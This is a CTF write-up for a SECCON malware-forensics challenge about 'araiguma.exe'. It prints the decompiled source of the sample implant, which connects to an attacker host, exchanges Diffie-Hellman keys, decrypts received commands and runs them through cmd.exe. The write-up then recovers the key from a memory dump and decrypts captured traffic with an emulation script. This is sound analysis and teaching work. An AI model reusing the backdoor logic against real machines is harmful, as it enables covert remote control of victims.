# Introduction

Challenge description:
> I found a suspicious process named "araiguma.exe" running on my computer. Before removing it, I captured my network and dumped the process memory. Could you investigate what the malware is doing?

The challenge is a _reversing_ challenge that was solved by _27 teams_. Part of the challenge are 4 files:
```
araiguma.DMP  araiguma.exe.bin  network.pcap  README.txt

> file -k araiguma.exe.bin araiguma.DMP network.pcap
araiguma.exe.bin: PE32+ executable (console) x86-64, for MS Windows\012- data
araiguma.DMP:     Mini DuMP crash report, 15 streams, Mon Oct 31 13:53:13 2022, 0x421826 type\012- data
network.pcap:     pcap capture file, microsecond ts (little-endian) - version 2.4 (Ethernet, capture length 262144)\012- data
```

# Analysis

`README.md` offers an useful graphic perspective about the challenge:
```
> cat README.txt
The following diagram discribes what each file is.
Do not run araiguma.exe unless you fully understand the logic.

+-- Victim Machine --+       +-- Attacker Machine --+
| +--------------+   |       |   +-------------+    |
| | araiguma.exe |<------------->| kitsune.exe |    |
| +--------------+   |   ^   |   +-------------+    |
|        ^           |   |   |                      |
+--------|-----------+   |   +----------------------+
         |               |
  Memory |               | Packet
   Dump  |               | Capture
         |               |
  [ araiguma.DMP ] [ network.pcapng ]
```

Thanks to `IDA Pro`'s decompiler (and a few manual changes) it is easily possible to understand the high level functionalities:
```C
int __cdecl main(int argc, const char **argv, const char **envp)
{
  SIZE_T dwBytes; // [rsp+38h] [rbp-48h] BYREF
  struct sockaddr name; // [rsp+40h] [rbp-40h] BYREF
  struct WSAData WSAData; // [rsp+50h] [rbp-30h] BYREF
  char buf[4]; // [rsp+1F0h] [rbp+170h] BYREF
  DWORD pdwDataLen; // [rsp+1F4h] [rbp+174h] BYREF
  HCRYPTKEY hKey; // [rsp+1F8h] [rbp+178h] BYREF
  HCRYPTKEY phKey; // [rsp+200h] [rbp+180h] BYREF
  HCRYPTPROV hProv; // [rsp+208h] [rbp+188h] BYREF
  BYTE v12[4]; // [rsp+210h] [rbp+190h] BYREF
  void *p_g_G; // [rsp+218h] [rbp+198h]
  BYTE pbData[4]; // [rsp+220h] [rbp+1A0h] BYREF
  void *p_g_P; // [rsp+228h] [rbp+1A8h]
  LPCSTR pBuffer2; // [rsp+238h] [rbp+1B8h]
  BYTE *pbData_1; // [rsp+240h] [rbp+1C0h]
  SOCKET s; // [rsp+248h] [rbp+1C8h]
  BYTE *pBuffer; // [rsp+250h] [rbp+1D0h]
  HANDLE hHeap; // [rsp+258h] [rbp+1D8h]

  _main();
  *(_DWORD *)pbData = 64;
  p_g_P = &g_P;
  *(_DWORD *)v12 = 64;
  p_g_G = &g_G;
  hHeap = GetProcessHeap();
  if ( !hHeap )
    return 1;
  if ( !CryptAcquireContextA_0(
          &hProv,
          0i64,
          "Microsoft Enhanced DSS and Diffie-Hellman Cryptographic Provider",
          PROV_DSS_DH,
          CRYPT_VERIFYCONTEXT) )
    return 1;
  if ( CryptGenKey(hProv, CALG_DH_EPHEM, 0x2000041u, &phKey)
    && CryptSetKeyParam(phKey, KP_P, pbData, 0)
    && CryptSetKeyParam(phKey, KP_G, v12, 0)
    && CryptSetKeyParam(phKey, KP_X, 0i64, 0) )
  {
    if ( CryptExportKey(phKey, 0i64, 6u, 0, 0i64, &pdwDataLen) )
    {
      pBuffer = (BYTE *)HeapAlloc(hHeap, 0, pdwDataLen);
      if ( pBuffer )
      {
        if ( CryptExportKey(phKey, 0i64, 6u, 0, pBuffer, &pdwDataLen) )
        {
          WSAStartup(2u, &WSAData);
          s = socket(2, 1, 0);
          name.sa_family = 2;
          *(_WORD *)name.sa_data = htons(0x1F90u);
          inet_pton(2, "192.168.3.6", &name.sa_data[2]);
          if ( !connect(s, &name, 16) )
          {
            send(s, (const char *)&pdwDataLen, 4, 0);
            send(s, (const char *)pBuffer, pdwDataLen, 0);
            recv(s, buf, 4, 0);
            pbData_1 = (BYTE *)HeapAlloc(hHeap, 0, *(unsigned int *)buf);
            if ( pbData_1 )
            {
              recv(s, (char *)pbData_1, *(int *)buf, 0);
              if ( CryptImportKey(hProv, pbData_1, *(DWORD *)buf, phKey, 0, &hKey) )
              {
                HIDWORD(dwBytes) = 0x6801;
                if ( CryptSetKeyParam(hKey, KP_ALGID, (const BYTE *)&dwBytes + 4, 0) )
                {
                  memset(pbData_1, 0, *(unsigned int *)buf);
                  while ( recv(s, (char *)&dwBytes, 4, 0) == 4 )
                  {
                    pBuffer2 = (LPCSTR)HeapAlloc(hHeap, 0, (unsigned int)dwBytes);
                    if ( !pBuffer2 )
                      break;
                    recv(s, (char *)pBuffer2, dwBytes, 0);
                    if ( !CryptDecrypt(hKey, 0i64, 1, 0, (BYTE *)pBuffer2, (DWORD *)&dwBytes) )
                    {
                      HeapFree(hHeap, 0, (LPVOID)pBuffer2);
                      break;
                    }
                    ShellExecuteA(0i64, "open", "cmd.exe", pBuffer2, 0i64, 0);
                    memset((void *)pBuffer2, 0, (unsigned int)dwBytes);
                    HeapFree(hHeap, 0, (LPVOID)pBuffer2);
                  }
                }
              }
              HeapFree(hHeap, 0, pbData_1);
            }
            closesocket(s);
          }
          WSACleanup();
        }
        HeapFree(hHeap, 0, pBuffer);
      }
    }
    CryptDestroyKey(phKey);
  }
  CryptReleaseContext(hProv, 0);
  return 0;
}
```

Having the _dump crash report_ and the _network capture_, the idea of _emulating_ the dump was quite attractive comparing
to extracting the necessary encryption/decryption keys from the dump then reimplementing the decryption.
Luckily, there's a great tool for this kind of purposes of _dump emulation_: https://github.com/mrexodia/dumpulator (Thanks to [@mrexodia](https://twitter.com/mrexodia) for his work.)

Before emulation, the correct context/state has to be reconstructed for the [CryptDecrypt](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecrypt) call to succeed. That means having the following (correct) arguments:
- `hKey`
- `*pbData`
- `*pdwDataLen`

The arguments can be recovered in a few ways, the technique that I used is to pin/locate the value of `RBP` at the start of `main` then use the correct
_stack offsets_ to extract the arguments. We know that the global `g_P` is saved at `rbp+1A8h`
```
.text:000000000040156F 268 48 8D 05 8A 2A 00 00                                         lea     rax, g_P
.text:0000000000401576 268 48 89 85 A8 01 00 00                                         mov     [rbp+1A8h], rax
```
and in the _dump_ that is the _stack address_:
```
00000000`0064fde8 0000000000404000 araiguma+0x4000
```
So to obtain `hKey` we can use the following calculation (in _windbg_):
```
0:000> ? 00000000`0064fde8 - 1a8 + 178
Evaluate expression: 6618552 = 00000000`0064fdb8
0:000> dq 00000000`0064fdb8 L1
00000000`0064fdb8  00000000`000f62e0
```
_Note_: 0x178 is from
```
.text:00000000004019FB 268 48 8B 85 78 01 00 00                                         mov     rax, [rbp+178h]
```
the _offset_ of `hKey` from `RBP`. Using the same approach it is possible to obtain the rest of the arguments.

# Solution

Using the correct arguments and recreating the correct state before the `CryptDecrypt` call, the solution script that I've
glued together durint the CTF is:
```python
from dumpulator import Dumpulator

CryptDecrypt = 0x00007ffa9e0bf410
GetLastError = 0x00007ffa9f6e5bf0

#enc_data = bytes.fromhex("0602000002aa00000044483100020000288f76749ec20b9ab18c618418ae9a70722618dc685e667fc0c19b906a6aa3a571f473ea0eaada269f29860d55ddcba0367ee6f7a1fac83d2d7395482930b3b8")
enc_data = bytes.fromhex("8c28c20d027aa8bc9a71b107022421e907340de0f9a4c540611f2d95b560f8435fdb44ecb38876ddab1fe3ffcaf26aeb65b7f7f4d1d0bc6ceec521c77c27cd0ffba4a9d007228c478288b906b64d832be9822e123ec4a5abbc155a24b63a8c657c05ff6148124f")
dp = Dumpulator("araiguma.DMP", trace=True)
print(hex(dp.regs.rip))
# setup encrypted buffer
enc_buff = dp.allocate(0x80)
print(f"Allocated addr: {hex(enc_buff)}")
dp.write(enc_buff, enc_data)
# setup arguments and call
# pdwDataLen must be the length of the data to decrypt before the call https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecrypt
pdwDataLen = 0x0064fbf8
dp.write(pdwDataLen, (len(enc_data)).to_bytes(8, byteorder="little"))
# dp.push should do the job too, but ...
dp.write(dp.regs.rsp + 0x28, pdwDataLen.to_bytes(8, byteorder="little"))
dp.write(dp.regs.rsp + 0x20, enc_buff.to_bytes(8, byteorder="little"))
hKey, hHash, Final, dwFlags = 0x000f62e0, 0, 1, 0
res = dp.call(CryptDecrypt, [hKey, hHash, Final, dwFlags])
print(f"> Call result: {res}")
res = dp.call(GetLastError)
print(f"> Call result: {res}")
# get decrypted data
data = dp.read(enc_buff, 0x80)
print(f"Date: {data}")
```
`enc_data` content is to extracted from the _network capture_ (for convenience filter by `ip.addr == 192.168.3.6`).

And with a bit of patience, let's put a smile on our faces and a flag in our 'pockets':
```bash
Allocated addr: 0x2e10000
emu_start(7ffa9e0bf410, 5000, 0)
emulation finished, cip = 5000
> Call result: 1
emu_start(7ffa9f6e5bf0, 5000, 0)
emulation finished, cip = 5000
> Call result: 0
Date: bytearray(b'/C echo "SECCON{M3m0ry_Dump+P4ck3t_C4ptur3=S0ph1st1c4t3d_F0r3ns1cs}" > C:\\Users\\ctf\\Desktop\\flag.txt\r\n\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00')
```

# Conclusion

Thanks to the author of the challenge ([ptr-yudai](https://twitter.com/ptrYudai)) and to [@mrexodia](https://twitter.com/mrexodia) for his
nice tool.

happy ctfing!
